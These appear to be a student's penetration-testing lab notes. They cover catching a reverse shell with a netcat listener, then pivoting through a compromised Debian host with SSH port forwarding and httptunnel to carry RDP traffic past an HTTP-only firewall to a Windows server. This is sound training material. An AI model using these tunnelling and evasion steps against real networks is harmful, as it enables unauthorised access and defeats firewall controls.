# 20.5.1.1.2. Start the *apache2* service and exploit the vulnerable web application hosted on port 443 (covered in a previous module) in order to get a reverse HTTP shell.

Start the apache2 service
```plaintext
root@debian:/home/student# systemctl start apache2

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 4444
[sudo] password for kali:

Run a netcat cmd on the exploit to connect to our Kali machine.

Notice we have a shell

# 20.5.1.1.3. Replicate the scenario demonstrated above using your dedicated clients.

Ensure that 'httptunnel' has been installed onto the Kali machine
```plaintext
kali@kali:~$ sudo apt install httptunnel
```

### Using the shell we caught for the Debian machine, create a local forward from it (127.0.0.1) and log in as student. We forward all requests on port 8888(0.0.0.0:8888) to the Windows Server's remote desktop port (172.16.214.5:3389)
`ssh -L 0.0.0.0:8888:172.16.214.5:3389 student@127.0.0.1`
![b8bee8a5f52cf51d3813e00e667addcd.png](db324dec5d044a8aabff091637bab747.png)

Verify that you're listening on port 8888

### Still from the Debian client, create an HTTPTunnel out to our Kali Linux machine so that we can slip traffic past the HTTP-only protocol restriction.
`hts --forward-port localhost:8888 1234`
![b9af51816cb3976f207ffb881f1a90ad.png](e07d8700274f4c1b8208bc529be0d4f0.png)

Confirm that the HTTPTunnel server is up and running using ps and ss
`ps aux | grep hts`
![fddd82d99084c45ba7ced09b1518ee0b.png](37ef05b0749c452089a0cab158ac705d.png)
`ss -antp | grep "1234"`

### Create an HTTPTunnel client that takes our remote desktop traffic, encapsulates it into an HTTP stream, and sends it to the listening HTTPTunnel server.

Listen on localhost port 8080 (--forward-port 8080), HTTP-encapsulate the traffic, and forward it across the firewall to our listening HTTPTunnel server port on port 1234
`htc --forward-port 8080 192.168.214.44:1234`

Verify the HTTPTunnel client it working
`ps aux | grep htc`
`ss -antp | grep "8080"`

Now, all traffic sent to TCP port 8080 on our Kali Linux machine will be redirected into our HTTPTunnel (where it is HTTP-encapsulated, sent across the firewall to the compromised Linux server and decapsulated) and redirected again to the Windows Serverâ€™s remote desktop service.

Open Wireshark and sniff the traffic to validate this is HTTP-encapsulated



Test to see if we get redirected to the Windows Sever's remote desktop service
`rdesktop 127.0.0.1:8080`
![bfb65ffbeddedf56caba07a10a17fd4b.png](9a9401e586d34c4ea445db5c2260a18c.png)
We get the Windows Server remote desktop

We confirm on Wireshark -> interface: tun0 -> display filter: host 192.18.119.214 (Kali)
Here we see that the traffic goes to and from Kali to Debian client
